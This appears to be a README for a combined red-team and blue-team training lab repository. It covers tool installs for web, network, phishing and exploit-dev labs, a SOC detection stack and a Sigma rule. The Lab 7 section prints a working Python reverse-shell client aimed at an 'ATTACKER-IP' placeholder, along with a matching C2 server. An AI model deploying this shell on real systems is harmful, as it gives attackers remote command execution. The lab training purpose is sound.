# 🧨 ZedSec Unified Cyber & Defense Lab Repository

This is ZedSec’s complete arsenal for both offensive and defensive cybersecurity operations. This unified Markdown document merges:
- Offensive Cyber Lab Architectures
- Defensive SOC & Detection Toolkit
- Purple Teaming Integration Workflows

For professional red teamers, blue team analysts, and hybrid ops units.

---

## 🔧 Offensive Cyber Labs – ZedSec BlackCell

### 🧠 Lab 1: Offensive Operations Lab

**Tools:** Kali Linux, Python, VirtualBox  
**Command to install essentials:**
```bash
sudo apt update && sudo apt install -y python3-pip virtualbox nmap wireshark
```
**Usage:**
- Create reverse shells
- Build custom payloads in Python

### 🔬 Lab 2: Malware Dev & RE Lab

**Tools:** FLARE VM, REMnux, IDA Free, Ghidra, PEStudio, Cuckoo Sandbox  
**FLARE VM install:**
```powershell
# Run in PowerShell as Administrator
Set-ExecutionPolicy Bypass -Scope Process -Force; 
iwr -useb https://raw.githubusercontent.com/mandiant/flare-vm/master/install.ps1 | iex
```
**Usage:**
- Analyze malware with Ghidra, x64dbg
- Run Cuckoo to sandbox sample behavior

### 🌐 Lab 3: Web Pentesting & SQLi Lab

**Setup:**
```bash
sudo apt install apache2 php mysql-server php-mysql unzip
wget https://github.com/digininja/DVWA/archive/master.zip
unzip master.zip && sudo mv DVWA* /var/www/html/dvwa
```
**Tools:** Burp Suite, SQLMap, Nikto  
**Usage:** Web attack surface enumeration, SQLi practice

### 🎭 Lab 4: Network Attacks Lab

**Install Tools:**
```bash
sudo apt install bettercap scapy wireshark
```
**Usage:**
- MITM with Bettercap
- Packet capture/sniffing with Scapy

### 🧪 Lab 5: Social Engineering & Phishing Lab

**SET Toolkit Setup:**
```bash
git clone https://github.com/trustedsec/social-engineer-toolkit.git
cd social-engineer-toolkit
sudo pip install -r requirements.txt
sudo python setup.py install
```
**Usage:** Spear phishing campaigns and USB payload testing

### 💣 Lab 6: Exploit Dev & Fuzzing Lab

**Tools:** Vulnserver, SLMail, Immunity Debugger, Mona.py
**Windows Command:**
```powershell
choco install immunitydebugger
```
**Usage:**
- Stack-based buffer overflows
- SEH exploitation walkthroughs

### 📡 Lab 7: Multi-Agent C2 Lab

**Reverse Shell Python Client:**
```python
import socket, subprocess
client = socket.socket()
client.connect(('ATTACKER-IP', 4444))
while True:
    cmd = client.recv(1024).decode()
    if cmd == "exit": break
    output = subprocess.getoutput(cmd)
    client.send(output.encode())
```
**C2 Server:**
```python
import socket
server = socket.socket()
server.bind(('0.0.0.0', 4444))
server.listen(1)
client, addr = server.accept()
while True:
    cmd = input("C2> ")
    client.send(cmd.encode())
    print(client.recv(4096).decode())
```

---

## 🛡️ ZedSec BlueCell Defense & SOC Toolkit

### 📦 Core Tooling
```bash
sudo apt install filebeat auditbeat suricata zeek elasticsearch kibana logstash
```
**Additional Tools:**
```bash
sudo apt install clamav lynis jq net-tools git python3-pip
```
**Useful Services:**
- Enable and start:
```bash
sudo systemctl enable --now elasticsearch kibana logstash filebeat
```

### 🎯 SOC Detection Workflow
1. **Ingest:** Auditd, Sysmon logs (via Filebeat/Auditbeat)
2. **Inspect:** Kibana visualizations
3. **Enrich:** GeoIP, threat intel, Sigma rules
4. **React:** Alert > Hive Case > SOAR response

### 🚨 Sigma Rule Example
```yaml
detection:
  selection:
    EventID: 4688
    NewProcessName|contains: powershell.exe
    CommandLine|contains: "-enc"
  condition: selection
```

---

## 🎯 Purple Team Integration Guide

### Goal
Use Red Team payloads to validate Blue Team detections in real time.

### Workflow
1. **Log collection** on victim (Auditd, Sysmon)
2. **Log forwarding** to ELK or Wazuh via Filebeat
3. **Trigger attack** (e.g., reverse shell, keylogger, phishing)
4. **Observe detections** via Kibana/Wazuh alerts
5. **Validate & tune** Sigma, YARA detection rules

### Attack Simulation
```bash
git clone https://github.com/redcanaryco/atomic-red-team.git
cd atomic-red-team
Invoke-AtomicTest T1059.001
```

---

## 📁 Recommended Repo Structure
```
zedsec-unified/
├── offensive-labs/
│   ├── payloads/
│   ├── reverse_shells/
│   ├── C2-handlers/
├── defense-stack/
│   ├── elk-configs/
│   ├── wazuh-rules/
│   ├── dashboards/
├── purple-team/
│   ├── sigma/
│   ├── attack-sims/
│   ├── integration-scripts/
└── playbooks/
```

---

## 🔥 Strategy Profiles

| Profile        | Included Labs                               |
|----------------|---------------------------------------------|
| **Strike Lab** | Offensive Labs 1, 3, 4, 5                   |
| **Analysis Lab** | Malware Dev, Exploit Dev (Labs 2, 6)        |
| **Legacy Lab** | Win7 Exploit Dev (Lab 6)                    |
| **OPSEC Lab**  | Labs 1, 2, 7 (focus on stealth & evasion)   |
| **BlueCell**   | Wazuh, ELK, Zeek, Velociraptor              |
| **Purple Lab** | Full Red + Blue integrated pipeline         |

---

## 🧠 Execution Tips
- Use snapshots for rollback
- Simulate, observe, improve
- Always operate in isolated, safe environments

---

> ⚔️ ZedSec: We don’t wait for attacks — we simulate them, monitor them, dissect them, and win.

**— ZedSec Unified Operations Division**
